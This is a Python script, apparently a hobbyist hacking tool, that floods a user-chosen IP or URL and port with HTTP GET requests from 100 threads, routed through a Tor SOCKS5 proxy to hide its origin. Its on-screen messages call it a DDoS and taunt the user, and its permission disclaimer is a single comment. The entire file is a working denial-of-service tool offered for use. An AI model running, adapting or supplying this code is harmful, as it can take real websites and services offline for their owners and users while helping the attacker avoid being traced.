import socks
import socket
import threading
import random
import time
from colorama import Fore, init

# =======================
# =======================
# By: momento
# This script will send multiple requests to the target server using Tor as a proxy
# Enjoy and make sure you have permission to test.

# ASCII Art
print("""
░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░  
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░ 
░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░   ░▒▓████▓▒░  
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░                  
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░                  
░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░░▒▓███████▓▒░   ░▒▓█▓▒░      ░▒▓█▓▒░     
                                                                   
                                                                   
                            by: momentoByte
""")

# =======================
# TURN ON VPN MESSAGE
# =======================
print(Fore.YELLOW + "Turn on your VPN kiddies!" + Fore.RESET)
input("Press Enter to continue...")

# Masukkan IP atau URL sasaran dan port melalui terminal
target_ip = input("Masukkan IP/URL sasaran: ")
target_port = int(input("Masukkan port sasaran (contoh 80 untuk HTTP): "))

# Proxy details
proxy_ip = "127.0.0.1"  # Gantikan dengan IP proksi (contoh Tor atau pelayan SOCKS5 lain)
proxy_port = 9050  # Port proksi (contohnya untuk Tor, biasanya 9050)

# Message to send
payload = "GET / HTTP/1.1\r\nHost: {}\r\n\r\n".format(target_ip).encode()

# Number of threads
thread_count = 100

# SOCKS5 setup
socks.set_default_proxy(socks.SOCKS5, proxy_ip, proxy_port)
socket.socket = socks.socksocket

# =======================
# STARTING THE ATTACK
# =======================
print(f"[*] Starting attack on {target_ip} on port {target_port} using Tor proxy...")
print(f"[*] Number of threads: {thread_count}")
print(f"[*] Proxy details: {proxy_ip}:{proxy_port}")

# Initialize request counter
request_counter = 1
# Stop flag for controlling the threads
stop_attack = False

def attack(thread_id):
    global request_counter, stop_attack
    while not stop_attack:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            s.send(payload)
            # Print request sent to target with request count in red
            print(Fore.RED + f"{request_counter} Request sent to {target_ip}", flush=True)
            request_counter += 1  # Increment the request count
            s.close()
        except Exception as e:
            print("Error:", e)
            time.sleep(0.1)

# =======================
# CREATING THREADS
# =======================
print(f"[*] Launching {thread_count} threads...")
# Create threads
threads = []
for i in range(thread_count):
    thread = threading.Thread(target=attack, args=(i + 1,))
    threads.append(thread)
    thread.start()

# =======================
# END OF SCRIPT

# Catch Ctrl+C to stop the attack and display a message
try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    # Stop the attack
    stop_attack = True
    # Stop all threads
    for thread in threads:
        thread.join()
    
    # When Ctrl+C is pressed
    print(Fore.YELLOW + "\nAre you done? You just stopped the DDoS :(" + Fore.RESET)
    input(Fore.YELLOW + "Press Enter to continue... " + Fore.RESET)
    print(Fore.YELLOW + "Goodbye, YOU FREAK!" + Fore.RESET)
